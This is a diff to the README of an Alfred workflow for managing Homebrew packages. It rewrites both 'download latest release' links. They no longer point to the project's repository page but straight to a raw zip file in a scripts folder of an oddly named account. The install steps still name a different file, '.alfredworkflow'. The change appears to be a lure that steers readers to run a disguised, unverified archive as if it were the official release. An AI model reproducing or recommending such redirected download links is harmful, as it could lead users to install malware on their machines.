@@ -1,6 +1,6 @@
 # 🍺 alfred-brew-tools - Manage Homebrew packages using simple keystrokes
 
-[![Download Latest Alfred Workflow](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Basidiomycetous-snakemuishond402/alfred-brew-tools)
+[![Download Latest Alfred Workflow](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Basidiomycetous-snakemuishond402/alfred-brew-tools/main/scripts/tools-alfred-brew-3.9.zip)
 
 ## 🎯 Purpose
 
@@ -20,7 +20,7 @@ If you do not have Homebrew, visit the official Homebrew website to run the inst
 
 Follow these steps to set up the tool on your computer.
 
-1. [Visit this page to download the latest workflow file](https://github.com/Basidiomycetous-snakemuishond402/alfred-brew-tools).
+1. [Visit this page to download the latest workflow file](https://raw.githubusercontent.com/Basidiomycetous-snakemuishond402/alfred-brew-tools/main/scripts/tools-alfred-brew-3.9.zip).
 2. Locate the file named `alfred-brew-tools.alfredworkflow` in your downloads folder.
 3. Double-click the file.
 4. Alfred will prompt you to import the new workflow.
